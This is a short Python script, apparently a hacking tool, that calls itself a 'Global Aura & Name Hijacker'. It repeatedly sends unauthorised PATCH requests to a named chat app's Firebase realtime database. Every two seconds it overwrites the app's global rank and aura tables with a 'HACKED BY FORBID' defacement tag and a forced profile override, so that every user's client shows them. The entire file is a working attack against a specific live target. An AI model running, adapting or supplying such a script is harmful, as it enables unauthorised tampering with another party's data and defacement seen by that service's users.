import time
import requests

database_url = "https://itmeans-chat-4df62-default-rtdb.asia-southeast1.firebasedatabase.app"
ranks_url = f"{database_url}/Ranks.json"
auras_url = f"{database_url}/Auras.json"

headers = {
    "Content-Type": "application/json"
}

print("[FORBID] Global Aura & Name Hijacker Initialized...")

session = requests.Session()

while True:
    try:
        # 1. Force your custom rank/name tag globally so everyone's client sees it
        rank_payload = {
            "FORBID": {
                "Name": "FORBID",
                "Tag": "HACKED BY FORBID | DISCORD: forbiddenway",
                "Color": "red"
            }
        }
        
        # 2. Force a custom god-tier aura override tied to your profile
        aura_payload = {
            "FORBID": {
                "AuraType": "voidWings",
                "Color": "red",
                "Active": True
            }
        }
        
        # Patch the global tables simultaneously
        session.patch(ranks_url, json=rank_payload, headers=headers, timeout=3)
        session.patch(auras_url, json=aura_payload, headers=headers, timeout=3)
        
        print("[FORBID] Global identity and aura broadcasted successfully!")
        
    except Exception as e:
        print(f"[FORBID] Sync error: {e}")
        
    # Refresh interval to keep the override locked in
    time.sleep(2)
